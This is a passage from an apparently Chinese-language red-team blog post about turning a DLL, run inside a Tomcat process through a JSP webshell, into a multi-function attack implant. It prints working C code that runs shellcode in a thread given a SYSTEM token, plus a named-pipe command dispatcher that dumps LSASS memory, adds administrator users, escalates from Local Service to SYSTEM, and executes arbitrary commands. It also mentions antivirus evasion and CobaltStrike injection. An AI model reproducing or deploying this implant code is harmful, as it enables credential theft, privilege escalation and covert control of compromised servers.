因此常规的办法是不行了，于是请教了头像哥，他的回复与我想的一样，用高权限的Token去跑一个特权线程，利用这个特权线程去执行Shellcode。
    void ExecuteShellCodeWithToken(HANDLE hToken) {
        HANDLE hThread = INVALID_HANDLE_VALUE;
        DWORD dwThreadId = 0;
        HANDLE hHeap = HeapCreate(HEAP_CREATE_ENABLE_EXECUTE | HEAP_ZERO_MEMORY, 0, 0);
        PVOID Mptr = HeapAlloc(hHeap, 0, g_dwShellcodeSize);
        RtlCopyMemory(Mptr, g_ShellcodeBuffer, g_dwShellcodeSize);
        hThread = CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)Mptr, NULL, CREATE_SUSPENDED, &dwThreadId);
        SetThreadToken(&hThread, hToken);
        ResumeThread(hThread);
    }
思路如下：
  * 将Shellcode拷贝到可执行堆内存块中
  * 创建一个暂停的线程
  * 将特权Token设置覆盖掉暂停的线程Token
  * 恢复线程执行
成功执行Shellcode后的样子是这样的：
上线的User是SYSTEM，但是whoami是Local Service，这是因为当前线程是SYSTEM的，获取用户名的GetUserName
API是以当前线程Token作为权限查询的，而创建进程时并不会直接复制模拟的特权Token，这个时候只需要使用CobaltStrike的进程注入到其他SYSTEM进程即可。解决完Local
Service提权到SYSTEM被数字杀毒拦截的问题后，那就要思考如何做武器化了，因为在实战中不可能上传一个个DLL文件，我需要把所有的代码写到一个DLL中，通过控制JSP
Webshell的参数来达到各种功能的调用。
## 0x07 武器化的思路与实现
所有的代码跑在Tomcat的进程里的，而且只能执行DLLMain，那么怎么通过某种技术可以使得发送一个Web请求就执行DLL中的一些功能呢？
这个问题其实并没有难倒我，最简单的办法是用文件传递参数，每个Web请求过来后往文件中写内容，然后DLLMain里写一个循环读取也可以，但是文件的读写容易被干扰，并且涉及到线程的控制，稍微干扰一下就产生读写问题，容错率不高。
最终我采用了管道的形式，在DLLMain被执行时就创建一个命名管道，每个请求会连接管道往里写入16进制的单字节指令。
部分代码：
    for (;;) {
            if (ConnectNamedPipe(hPipe, NULL) > 0) {
                CHAR szBuffer[BUFF_SIZE];
                BYTE  bMethod; // 操作方法
                ZeroMemory(szBuffer, BUFF_SIZE);
                wprintf(L"[+] Client Connected...\n");
                // 读取操作方法
                ReadFile(hPipe, &bMethod, 1, &dwLen, NULL);
                switch (bMethod)
                {
                case METHOD_WMI_CREATE_PROCESS:
                    /// 
                    /// 调用WMIC创建进程，无回显
                    /// 参数：process
                    /// 
                    /// 
                    /// 
                    ReadFile(hPipe, szBuffer, BUFF_SIZE, &dwLen, NULL);
                    CheckSuccessAndSendMsg(WMICCreateProcess(char2wchar(szBuffer)), hPipe);
                    break;
                case METHOD_MINIDUMP_LSASS:
                    /// 
                    /// 高权限的情况下转储Lsass进程内存
                    /// 参数：dump
                    /// 
                    /// 
                    /// 
                    CheckSuccessAndSendMsg(MiniDumpLsass(), hPipe);
                    break;
                case METHOD_ADD_USER:
                    /// 
                    /// 高权限的情况下添加用户
                    /// 参数：user
                    /// 
                    /// 
                    /// 
                    CheckSuccessAndSendMsg(CreateAdminUserInternal(), hPipe);
                    break;
                case METHOD_SHELL_CODE_LOADE:
                    /// 
                    /// 执行Shellcode
                    /// 参数：code
                    /// 
                    /// 
                    /// 
                    ReadFile(hPipe, szBuffer, BUFF_SIZE, &dwLen, NULL);
                    CheckSuccessAndSendMsg(ExecuteShellCode(szBuffer, dwLen), hPipe);
                    break;
                case METHOD_GETSYSTEM:
                    /// 
                    /// 创建命名管道
                    /// 参数：system
                    /// 
                    /// 
                    /// 
                    CheckSuccessAndSendMsg(Service2System(), hPipe);
                    break;
                case METHOD_SYSTEM_EXECUTE:
                    /// 
                    /// 触发RPC连接提权管道
                    /// 参数：system-run
                    /// 
                    /// 
                    /// 
                    CheckSuccessAndSendMsg(Execute(), hPipe);
                    break;
                case METHOD_SET_SYSTEM_SHELLCODE:
                    /// 
                    /// 设置全局Shellcode
                    /// 参数：system-code
                    /// 
                    /// 
                    /// 
                    ZeroMemory(szBuffer, BUFF_SIZE);
                    ReadFile(hPipe, szBuffer, BUFF_SIZE, &dwLen, NULL);
                    g_ShellcodeBuffer = new char[dwLen];
                    RtlCopyMemory(g_ShellcodeBuffer, szBuffer, dwLen);
                    g_dwShellcodeSize = dwLen;
                    break;
                case METHOD_UNSET_SYSTEM_SHELLCODE:
                    /// 
                    /// 清空全局Shellcode
                    /// 参数：system-uncode
                    /// 
                    /// 
                    /// 
                    g_dwShellcodeSize = 0;
                    g_ShellcodeBuffer = NULL;
                    break;
                default:
                    break;
                }
                // 关闭连接
                DisconnectNamedPipe(hPipe);
            }
METHOD开头的常量代表了不同的功能：
    #define PIPE_NAME L"\\\\.\\pipe\\josPipe"
    #define BUFF_SIZE 1024
    #define METHOD_WMI_CREATE_PROCESS 0x00 // WMIC 创建进程
    #define METHOD_SHELL_CODE_LOADE 0x01  // SHELLCODE 加载
    #define METHOD_MINIDUMP_LSASS 0x02   // 转储Lsass.exe
    #define METHOD_ADD_USER 0x03  // 添加用户
    #define METHOD_GETSYSTEM 0x04  // 利用EFS获取SYSTEM的Token
    #define METHOD_SYSTEM_EXECUTE 0x05 // 以SYSTEM权限执行命令
    #define METHOD_SET_SYSTEM_SHELLCODE 0x07 // 设置Shellcode
    #define METHOD_UNSET_SYSTEM_SHELLCODE 0x08 // 取消设置Shellcode
Java Webshell的改造代码如下：
    %>
`java.io.RandomAccessFile`可以读写命令管道，通过修改Header头`WWW-Authenticate`来控制不同的功能，每个功能都有一个16进制的编号，剩余的Body内容将会被放到其他内存区域，以供功能函数调用读取，如此以来解决了每个请求都可以执行不同功能的问题，只发送一次DLL就可以将DLL模块打入Tomcat/Java进程的内存中执行，并且利用管道读写的特性也能够实现数据的回显，这个已经在示例代码中体现出来了。
SERVICE提权到SYSTEM权限并执行任意代码的流程示例图如下：
公开的DLL模块代码：
演示视频：暂无。
* * *